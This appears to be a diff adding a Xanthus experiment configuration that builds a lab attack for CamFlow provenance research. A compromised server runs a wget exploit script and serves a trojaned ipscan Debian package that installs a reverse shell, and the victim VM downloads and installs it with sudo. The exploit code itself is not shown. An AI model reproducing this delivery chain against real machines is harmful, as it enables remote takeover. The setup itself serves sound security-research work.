@@ -1,0 +1,140 @@
+# -*- mode: ruby -*-
+# vi: set ft=ruby
+
+
+# -*- mode: ruby -*-
+# vi: set ft=ruby
+
+Xanthus.configure do |config|
+  config.name = 'camflow'
+  config.authors = 'Xueyuan Michael Han'
+  config.description = %q{
+A simple CamFlow example to demonstrate:
+
+* Xanthus' compatibility with CamFlow, a whole-system provenance capture system, as its underlying audit system
+* How one can spawn multiple virtual machines in the framework
+* How one can create multiple logical steps in running the experiment in the framework
+* How one can write command in the framework directly
+* How one can provide scripts to virtual machines running in the framework
+* How one can run multiple jobs and multiple iterations within a job in the framework
+
+A standard Ubuntu Linux server (bento/ubuntu-18.04) machine is spawned to simulate an adversarial scenario where this compromised FTP server serves a weasponized Debian package to the victim machine.
+The victim machine (michaelh/ubuncam) is monitored by CamFlow and has pre-installed various vulnerable applications,
+including a now-outdated `wget` whose vulnerability is exploited by the attacker.
+
+In this simple example, when the victim machine downloads an ipscan Debian package from a compromised HTTP server machine (also the attacker machine),
+the wget command is redirectly to its FTP server and delivers a weasponized ipsan Debian package to the victim.
+Once the package is installed, the TCP reserver shell is installed at the same time and the attacker (Kali Linux) is able to control the victim machine.
+
+This example also runs the experiment of a benign behavior where a legitimate ipscan Debian package is downloaded. No harm was done in the benign experiment.
+
+Each experiment runs twice.
+
+Everything is done automatically through scripts for reproducility with minimum human interaction.
+}
+  # Use a random but fixed seed for reproducibility
+  config.seed = 298395371344679276525581697204129968199
+
+  # Marcos for start and stop CamFlow provenance capture system
+  config.script :camflow_start do
+    Xanthus::CAMFLOW_START
+  end
+
+  config.script :camflow_stop do
+    Xanthus::CAMFLOW_STOP
+  end
+
+  # Multiple logical steps to run experiments in a VM
+  config.script :pre do
+    %q{%{
+      mkdir wgets
+      cd wgets
+      sleep 5
+    }}
+  end
+
+  config.script :normal do
+    %q{%{
+      /usr/local/bin/wget https://github.com/angryip/ipscan/releases/download/3.5.5/ipscan_3.5.5_amd64.deb
+      sudo dpkg -i ipscan_3.5.5_amd64.deb
+      rm ipscan_3.5.5_amd64.deb
+      sleep 5
+      apt list --installed > /tmp/list.txt
+    }}
+  end
+
+  config.script :attack do
+    %q{%{
+      /usr/local/bin/wget 192.168.33.3/ipscan_3.5.5_amd64.deb
+      sudo dpkg -i ipscan_3.5.5_amd64.deb
+      rm ipscan_3.5.5_amd64.deb
+      sleep 5
+      apt list --installed > /tmp/list.txt
+    }}
+  end
+
+  config.script :post do
+    %q{%{
+      cd ..
+      rm -rf wgets
+    }}
+  end
+
+  # Actions taken by a different VM
+  # It is able to run a python script provided by the user
+  config.script :server do
+    %q{%{
+      sudo apt-get -y update
+      sudo apt-get -y install build-essential
+      sudo apt-get -y install python-pip python-dev
+      sudo pip install pyftpdlib
+
+      mkdir /tmp/ftptest
+      cd /tmp/ftptest
+      cp /vagrant/ipscan_3.5.5_amd64.deb /tmp/ftptest
+      sudo python -m pyftpdlib -p21 -w &
+      sleep 5
+      mkdir /tmp/webtest
+      cd /tmp/webtest
+      wget https://github.com/angryip/ipscan/releases/download/3.5.5/ipscan_3.5.5_amd64.deb
+      sudo python3 /vagrant/wget-exploit3.py > /tmp/wget.txt & 
+      sleep 5
+    }}
+  end
+
+  # Spawn two VMs, one is custom packaged (michaelh/ubuncam) by the author
+  # and the other is a basic Ubuntu VM box
+  config.vm :camflow do |vm|
+    vm.box = 'michaelh/ubuncam'
+    vm.version = '0.0.3'
+    vm.ip = '192.168.33.8'
+  end
+
+  config.vm :server do |vm|
+    vm.box = 'bento/ubuntu-18.04'
+    vm.version = '201812.27.0'
+    vm.ip = '192.168.33.3'
+  end
+
+  # Xanthus supports multiple jobs or experiments and within each job multiple iterations
+  config.job :normal_camflow do |job|
+    job.iterations = 2
+    job.tasks = {camflow: [:pre, :camflow_start, :normal, :camflow_stop, :post]}
+    job.outputs = {camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log', system: '/tmp/list.txt'}}
+  end
+
+  # Xanthus supports input scripts, files, packages provided by the user to the VM
+  # These provisions are accessible directly from '/vagrant' folder in the VM
+  config.job :attack_camflow do |job|
+    job.iterations = 2
+    job.tasks = {server: [:server], camflow: [:pre, :camflow_start, :attack, :camflow_stop, :post]}
+    job.inputs = {server: ['ipscan_3.5.5_amd64.deb', 'wget-exploit.py']}
+    job.outputs = {server: {trace: '/tmp/wget.txt'}, camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log', system: '/tmp/list.txt'}}
+  end
+
+  # Uncomment the following code and provide GitHub credentials to push the results to GitHub
+  # config.github do |github|
+  #   github.repo = '<ADD GITHUB REPO user/name>'
+  #   github.token = '<ADD GITHUB TOKEN>'
+  # end
+end
